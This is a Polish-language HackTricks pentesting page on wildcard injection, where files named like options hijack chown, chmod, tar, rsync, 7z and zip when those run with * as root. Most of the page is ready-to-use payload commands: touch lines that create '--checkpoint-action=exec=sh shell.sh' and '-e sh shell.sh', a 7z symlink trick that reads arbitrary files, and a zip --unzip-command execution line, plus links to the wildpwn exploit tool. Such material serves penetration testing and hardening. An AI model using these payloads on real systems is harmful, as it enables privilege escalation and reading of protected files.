{{#include ../../banners/hacktricks-training.md}}

## chown, chmod

Możesz **określić, którego właściciela pliku i uprawnienia chcesz skopiować dla pozostałych plików**
```bash
touch "--reference=/my/own/path/filename"
```
Możesz to wykorzystać używając [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(połączony atak)_\
Więcej informacji w [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Wykonaj dowolne polecenia:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Możesz to wykorzystać, używając [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(atak tar)_\
Więcej informacji w [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Wykonaj dowolne polecenia:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Możesz to wykorzystać używając [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(\_rsync \_attack)_\
Więcej informacji w [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

W **7z** nawet używając `--` przed `*` (zauważ, że `--` oznacza, że następujące dane wejściowe nie mogą być traktowane jako parametry, więc w tym przypadku tylko ścieżki do plików) możesz spowodować dowolny błąd w odczycie pliku, więc jeśli polecenie takie jak poniższe jest wykonywane przez roota:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
Możesz tworzyć pliki w folderze, w którym to jest wykonywane, możesz utworzyć plik `@root.txt` oraz plik `root.txt`, będący **symlinkiem** do pliku, który chcesz odczytać:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Wtedy, gdy **7z** jest uruchamiane, traktuje `root.txt` jako plik zawierający listę plików, które powinno skompresować (to, co oznacza istnienie `@root.txt`), a gdy 7z odczytuje `root.txt`, odczyta `/file/you/want/to/read` i **ponieważ zawartość tego pliku nie jest listą plików, zgłosi błąd** pokazując zawartość.

_ więcej informacji w Write-ups of the box CTF from HackTheBox._

## Zip

**Wykonaj dowolne polecenia:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
{{#include ../../banners/hacktricks-training.md}}
